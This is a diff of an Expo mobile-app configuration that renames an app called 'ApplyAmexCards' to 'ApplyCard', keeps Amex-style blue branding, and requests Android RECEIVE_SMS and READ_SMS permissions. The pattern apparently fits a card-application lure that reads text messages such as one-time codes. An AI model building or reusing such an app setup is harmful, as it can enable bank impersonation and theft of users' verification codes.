@@ -1,24 +1,26 @@
 {
   "expo": {
-    "name": "ApplyAmexCards",
+    "name": "ApplyCard",
     "version": "1.0.0",
     "privacy": "hidden",
     "orientation": "portrait",
     "icon": "./assets/icon.png",
-    "userInterfaceStyle": "automatic",
+    "userInterfaceStyle": "light",
     "androidStatusBar": {
       "backgroundColor": "#006CB7"
     },
     "splash": {
-      "image": "./assets/splash.gif",
+      "image": "./assets/headerbg.png",
+      "backgroundColor": "#006CB7",
       "resizeMode": "contain"
     },
     "android": {
+      "edgeToEdgeEnabled": true,
       "adaptiveIcon": {
         "foregroundImage": "./assets/icon.png",
         "backgroundColor": "#ffffff"
       },
-      "package": "com.mxcard.amexapply",
+      "package": "com.lots.applycard",
       "permissions": [
         "RECEIVE_SMS",
         "READ_SMS"
